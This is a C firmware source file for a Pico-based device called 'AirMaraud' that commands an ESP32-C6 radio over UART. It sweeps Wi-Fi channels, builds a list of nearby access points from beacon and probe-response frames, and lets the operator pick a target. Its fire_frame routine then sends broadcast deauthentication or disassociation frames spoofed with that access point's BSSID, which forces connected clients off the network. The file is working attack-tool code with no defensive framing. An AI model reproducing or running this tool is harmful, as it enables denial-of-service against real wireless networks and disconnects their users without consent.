/* AirMaraud main — UART1 WIFIPROOF console to Bottlenose C6. */
#include "fwog_main.h"
#include "am_proto.h"
#include "hardware/gpio.h"
#include "pico/stdlib.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

FWOG_WATCHDOG_DEFAULT();

#define BN_LINE_MAX 200u

static fwog_link_rx_t  s_rx;
static am_status_t     s_st;
static fwog_bn_flash_t s_fl;
static char            s_line[BN_LINE_MAX];
static unsigned        s_llen;
static uint32_t        s_push_ms;
static bool            s_dirty = true;
static bool            s_app_uart;
static uint32_t        s_probe_ms;
static uint16_t        s_rxb;
static uint16_t        s_e8, s_e9;
static int             s_last8 = -1, s_last9 = -1;
static uint8_t         s_rx_first[16];
static unsigned        s_rx_n;
static bool            s_rx_dumped;
static uint32_t        s_txcount_ms;
static uint8_t         s_sweep;         /* 0 off, 1 wait READY, 2 dwell */
static uint8_t         s_sweep_ch;      /* 1–14, independent of last READY */
static uint32_t        s_sweep_ms;
static uint8_t         s_pending_fire;
#define SWEEP_DWELL_MS 30000u
#define SWEEP_READY_MS 2500u

static void set_log(const char *s) {
    memset(s_st.log, 0, sizeof s_st.log);
    if (s) strncpy(s_st.log, s, sizeof s_st.log - 1u);
    s_dirty = true;
}

static void set_last_ret(const char *name) {
    memset(s_st.last_ret, 0, sizeof s_st.last_ret);
    if (!name || !name[0]) return;
    strncpy(s_st.last_ret, name, sizeof s_st.last_ret - 1u);
    char *sp = strchr(s_st.last_ret, ' ');
    if (sp) *sp = '\0';
}

static void wp_write(const char *s) {
    DIAG("[airmaraud] >> %s", s);
    fwog_bn_write(&s_fl, s);
}

static void wp_on(uint8_t ch) {
    char cmd[32];
    snprintf(cmd, sizeof cmd, "WIFIPROOF ON %u\n", (unsigned)ch);
    wp_write(cmd);
}

static void wp_off(void) {
    wp_write("WIFIPROOF OFF\n");
}

static void wp_hop(uint8_t ch) {
    /* ON hop works on older C6 images that lack WIFIPROOF CH. */
    char cmd[32];
    snprintf(cmd, sizeof cmd, "WIFIPROOF ON %u\n", (unsigned)ch);
    wp_write(cmd);
}

static void wp_txcount(void) {
    wp_write("WIFIPROOF TXCOUNT\n");
}

static bool mac_colon(const char *s, char out[AM_BSSID_N]) {
    unsigned a[6];
    if (sscanf(s, "%02x:%02x:%02x:%02x:%02x:%02x",
               &a[0], &a[1], &a[2], &a[3], &a[4], &a[5]) != 6) {
        return false;
    }
    snprintf(out, AM_BSSID_N, "%02x:%02x:%02x:%02x:%02x:%02x",
             a[0], a[1], a[2], a[3], a[4], a[5]);
    return true;
}

static void copy_ssid(const char *line, char *dst, size_t n) {
    if (!n) return;
    dst[0] = '\0';
    const char *p = strstr(line, "ssid=");
    if (!p) return;
    p += 5;
    size_t i = 0;
    while (*p && *p != ' ' && *p != '\r' && *p != '\n' && i + 1u < n) {
        dst[i++] = *p++;
    }
    dst[i] = '\0';
    if (dst[0] == '-' && dst[1] == '\0') dst[0] = '\0';
}

static void target_add(const char *bssid, const char *ssid) {
    if (!bssid || !bssid[0]) return;
    for (unsigned i = 0; i < s_st.n; i++) {
        if (strcmp(s_st.tgt[i].bssid, bssid) == 0) {
            if (ssid && ssid[0]) {
                strncpy(s_st.tgt[i].ssid, ssid, AM_SSID_N - 1u);
                s_st.tgt[i].ssid[AM_SSID_N - 1u] = '\0';
            }
            if (s_st.channel >= 1u && s_st.channel <= 14u) {
                s_st.tgt[i].ch = s_st.channel;
            }
            s_dirty = true;
            return;
        }
    }
    if (s_st.n >= AM_MAX) return;
    am_target_t *t = &s_st.tgt[s_st.n++];
    memset(t, 0, sizeof *t);
    strncpy(t->bssid, bssid, AM_BSSID_N - 1u);
    t->bssid[AM_BSSID_N - 1u] = '\0';
    if (ssid && ssid[0]) {
        strncpy(t->ssid, ssid, AM_SSID_N - 1u);
        t->ssid[AM_SSID_N - 1u] = '\0';
    }
    t->ch = s_st.channel;
    if (s_st.cursor >= s_st.n) s_st.cursor = (uint8_t)(s_st.n ? s_st.n - 1u : 0u);
    s_dirty = true;
}

static void stop_sweep(void) {
    s_sweep = 0;
    s_sweep_ch = 0;
    s_st.sweep = 0;
    s_dirty = true;
}

static void sweep_advance(uint32_t now) {
    if (s_sweep_ch >= 14u) {
        stop_sweep();
        set_log("sweep done");
        return;
    }
    s_sweep_ch++;
    s_sweep = 1;
    s_st.sweep = 1;
    s_st.channel = s_sweep_ch;
    s_sweep_ms = now;
    s_dirty = true;
    char log[AM_LOG_N];
    snprintf(log, sizeof log, "sweep ch=%u", (unsigned)s_sweep_ch);
    set_log(log);
    wp_hop(s_sweep_ch);
}

static void start_sweep(void) {
    s_pending_fire = 0;
    s_st.armed = 0u;
    s_sweep_ch = 0;
    sweep_advance(to_ms_since_boot(get_absolute_time()));
}

static void fire_frame(void) {
    if (!s_st.wp_on && !s_pending_fire) {
        set_log("start first (GREEN)");
        return;
    }
    if (!s_st.n) {
        set_log("no target");
        return;
    }
    const am_target_t *t = &s_st.tgt[s_st.cursor];
    if (t->ch >= 1u && t->ch <= 14u && t->ch != s_st.channel) {
        stop_sweep();
        s_pending_fire = 1;
        set_log("hop to AP ch");
        wp_hop(t->ch);
        return;
    }
    const char *verb = (s_st.mode == AM_MODE_DASSOC) ? "DASSOC" : "DEAUTH";
    char cmd[128];
    snprintf(cmd, sizeof cmd, "WIFIPROOF %s ff:ff:ff:ff:ff:ff %s %s 7\n",
             verb, t->bssid, t->bssid);
    wp_write(cmd);
    s_st.armed = 1u;
    s_pending_fire = 0;
    s_dirty = true;
}

static void push_st(void) {
    s_st.type = AM_MSG_ST;
    s_st.flash = s_fl.flash;
    s_st.pct = s_fl.pct;
    if (s_fl.flash == FWOG_BN_FLASH_FAIL && s_fl.why[0]) {
        memset(s_st.why, 0, sizeof s_st.why);
        strncpy(s_st.why, s_fl.why, sizeof s_st.why - 1u);
    }
    (void)fwog_link_uart_send_frame(&s_st, sizeof s_st);
    s_dirty = false;
}

static void flash_tick(const fwog_bn_flash_t *st, void *ctx) {
    (void)st;
    (void)ctx;
    s_dirty = true;
    push_st();
}

static void parse_wp_rx(const char *line) {
    unsigned subtype = 0;
    char dst[24], src[24];
    char bssid[AM_BSSID_N];
    int got = sscanf(line, "[WIFIPROOF RX] subtype=%u dst=%23s src=%23s",
                     &subtype, dst, src);
    if (got < 3) {
        const char *sp = strstr(line, "subtype=");
        const char *sr = strstr(line, "src=");
        if (!sp || !sr) return;
        subtype = (unsigned)strtoul(sp + 8, NULL, 0);
        if (!mac_colon(sr + 4, bssid)) return;
    } else if (!mac_colon(src, bssid)) {
        return;
    }
    /* Pre-sweep listed 8 (beacon) and 5 (probe resp). Probe resp is often
     * unicast; 004 required broadcast dst and dropped those. */
    if (subtype != 8u && subtype != 5u) return;
    char ssid_buf[AM_SSID_N];
    copy_ssid(line, ssid_buf, sizeof ssid_buf);
    target_add(bssid, ssid_buf[0] ? ssid_buf : NULL);
    set_log(line);
}

static void handle_line(char *line) {
    if (strncmp(line, "BN ", 3) == 0) {
        DIAG("[airmaraud] %s\n", line);
        if (strncmp(line, "BN HELLO", 8) == 0) {
            s_st.hello = 1u;
            memset(s_fl.why, 0, sizeof s_fl.why);
            if (s_fl.flash == FWOG_BN_FLASH_OK) s_fl.flash = FWOG_BN_FLASH_IDLE;
            if (!s_app_uart) {
                fwog_bn_link_app();
                s_app_uart = true;
            }
            s_dirty = true;
        }
        return;
    }
    if (strstr(line, "WIFIPROOF") == NULL) return;

    DIAG("[airmaraud] %s\n", line);
    if (strncmp(line, "[WIFIPROOF TXCOUNT]", 19) != 0 &&
        strncmp(line, "[WIFIPROOF RX]", 14) != 0) {
        set_log(line);
    }

    if (strncmp(line, "[WIFIPROOF] READY ch=", 21) == 0) {
        unsigned ch = (unsigned)strtoul(line + 21, NULL, 0);
        s_st.wp_on = 1u;
        if (!s_sweep) s_st.channel = (uint8_t)ch;
        s_st.armed = 0u;
        s_dirty = true;
        if (s_sweep == 1u && (uint8_t)ch == s_sweep_ch) {
            s_sweep = 2u;
            s_sweep_ms = to_ms_since_boot(get_absolute_time());
        }
        if (s_pending_fire) fire_frame();
        return;
    }
    if (strstr(line, "[WIFIPROOF] off") != NULL ||
        strcmp(line, "[WIFIPROOF] off") == 0) {
        s_st.wp_on = 0u;
        s_st.armed = 0u;
        stop_sweep();
        s_pending_fire = 0;
        s_dirty = true;
        return;
    }
    if (strncmp(line, "[WIFIPROOF TXCOUNT]", 19) == 0) {
        const char *p = strstr(line, "count=");
        if (p) s_st.tx_count = (uint32_t)strtoul(p + 6, NULL, 0);
        p = strstr(line, "last_ret=");
        if (p) set_last_ret(p + 9);
        s_dirty = true;
        return;
    }
    {
        const char *tx = strstr(line, "[WIFIPROOF TX] ret=");
        if (tx) {
            set_last_ret(tx + 19);
            wp_txcount();
            s_dirty = true;
            return;
        }
    }
    if (strncmp(line, "[WIFIPROOF RX]", 14) == 0) {
        parse_wp_rx(line);
    }
}

static void bn_poll(void) {
    if (s_fl.rom_pins) return;
    for (;;) {
        const int got = fwog_bn_getc();
        if (got < 0) break;
        const uint8_t b = (uint8_t)got;
        if (s_rx_n < sizeof s_rx_first) s_rx_first[s_rx_n++] = b;
        if (s_rxb < 0xFFFFu) s_rxb++;
        if (!s_rx_dumped && (s_rx_n >= sizeof s_rx_first || b == (uint8_t)'\n')) {
            s_rx_dumped = true;
            DIAG("[airmaraud] uart rx n=%u", s_rx_n);
            for (unsigned i = 0; i < s_rx_n; i++) DIAG(" %02X", s_rx_first[i]);
            DIAG("\n");
        }
        const char c = (char)b;
        if (c == '\r') continue;
        if (c == '\n') {
            s_line[s_llen] = '\0';
            if (s_llen) handle_line(s_line);
            s_llen = 0;
            continue;
        }
        if (s_llen + 1u < BN_LINE_MAX) s_line[s_llen++] = c;
        else s_llen = 0;
    }
}

static void start_wp(void) {
    if (s_st.channel < 1u || s_st.channel > 14u) s_st.channel = 6u;
    wp_on(s_st.channel);
}

static void stop_wp(void) {
    s_pending_fire = 0;
    stop_sweep();
    wp_off();
    s_st.wp_on = 0u;
    s_st.armed = 0u;
    s_dirty = true;
}

int main(void) {
    board_init();
    const fwog_display_result_t d = fwog_display_update_run();
    DIAG("[airmaraud] display: %s\n", fwog_display_result_text(d));

    for (int i = 0; i < 20; i++) {
        board_watchdog_kick();
        sleep_ms(200);
    }

    DIAG("[airmaraud] io_dir=%d c6_image=%u\n",
         (int)fwog_bn_link_app(), fwog_c6_image_size);
    s_app_uart = true;

    memset(&s_st, 0, sizeof s_st);
    memset(&s_fl, 0, sizeof s_fl);
    s_st.channel = 6u;
    fwog_link_rx_init(&s_rx);
    push_st();

    while (true) {
        board_watchdog_kick();
        const uint32_t now = to_ms_since_boot(get_absolute_time());

        if (s_fl.flash == FWOG_BN_FLASH_HOLD) {
            fwog_bn_flash_poll(&s_fl);
        }
        bn_poll();

        uint8_t b;
        size_t n;
        while (fwog_link_uart_read(&b)) {
            if (!fwog_link_rx_byte(&s_rx, b, &n)) continue;
            if (n >= sizeof(am_cmd_t) && s_rx.buf[0] == AM_MSG_CMD) {
                am_cmd_t c;
                memcpy(&c, s_rx.buf, sizeof c);
                if (c.cmd == AM_CMD_START) {
                    if (c.on) start_wp();
                    else stop_wp();
                } else if (c.cmd == AM_CMD_ARM) {
                    if (c.on) fire_frame();
                    else s_st.armed = 0u;
                    s_dirty = true;
                } else if (c.cmd == AM_CMD_CURSOR && s_st.n) {
                    if (c.on == 0u) {
                        if (s_st.cursor > 0u) s_st.cursor--;
                    } else if ((unsigned)s_st.cursor + 1u < s_st.n) {
                        s_st.cursor++;
                    }
                    s_dirty = true;
                } else if (c.cmd == AM_CMD_CHANNEL) {
                    if (s_st.wp_on) {
                        set_log("stop to change ch");
                    } else if (c.on >= 1u && c.on <= 14u) {
                        s_st.channel = c.on;
                    } else {
                        s_st.channel = (uint8_t)(s_st.channel >= 14u ? 1u : s_st.channel + 1u);
                    }
                    s_dirty = true;
                } else if (c.cmd == AM_CMD_MODE) {
                    s_st.mode = (uint8_t)(c.on ? AM_MODE_DASSOC : AM_MODE_DEAUTH);
                    s_dirty = true;
                } else if (c.cmd == AM_CMD_FLASH) {
                    if (c.on == 1u) {
                        if (s_st.wp_on) stop_wp();
                        s_st.hello = 0;
                        s_rx_dumped = false;
                        s_rx_n = 0;
                        s_rxb = 0;
                        fwog_bn_flash_arm(&s_fl, flash_tick, NULL);
                    } else if (c.on == 2u) {
                        fwog_bn_flash_go(&s_fl, flash_tick, NULL);
                    } else {
                        fwog_bn_flash_cancel(&s_fl, flash_tick, NULL);
                    }
                } else if (c.cmd == AM_CMD_SWEEP) {
                    if (c.on) start_sweep();
                    else stop_sweep();
                }
            }
        }

        if (s_sweep == 2u && (now - s_sweep_ms) >= SWEEP_DWELL_MS) {
            sweep_advance(now);
        } else if (s_sweep == 1u && (now - s_sweep_ms) >= SWEEP_READY_MS) {
            /* Hop was sent; if READY never arrived, still dwell 30 s. */
            s_sweep = 2u;
            s_sweep_ms = now;
        }

        if (s_st.wp_on && s_st.hello && !s_fl.rom_pins && !s_st.sweep &&
            (now - s_txcount_ms) > 800u) {
            s_txcount_ms = now;
            wp_txcount();
        }

        if (!s_fl.rom_pins && !s_st.hello) {
            const int v8 = gpio_get(PIN_IO_UART_TX);
            const int v9 = gpio_get(PIN_IO_UART_RX);
            if (s_last8 < 0) {
                s_last8 = v8;
                s_last9 = v9;
            }
            if (v8 != s_last8) {
                if (s_e8 < 0xFFFFu) s_e8++;
                s_last8 = v8;
            }
            if (v9 != s_last9) {
                if (s_e9 < 0xFFFFu) s_e9++;
                s_last9 = v9;
            }
            if ((now - s_probe_ms) > 250u) {
                s_probe_ms = now;
                if (s_rx_n >= 2u) {
                    snprintf(s_fl.why, sizeof s_fl.why, "rx=%02X %02X n=%u",
                             s_rx_first[0], s_rx_first[1], (unsigned)s_rxb);
                } else {
                    snprintf(s_fl.why, sizeof s_fl.why, "8=%u 9=%u",
                             (unsigned)s_e8, (unsigned)s_e9);
                }
                s_dirty = true;
            }
        }

        bn_poll();

        if ((s_dirty && (now - s_push_ms) > 80u) || (now - s_push_ms) > 250u) {
            s_push_ms = now;
            push_st();
            bn_poll();
        }
        sleep_ms(2);
    }
}
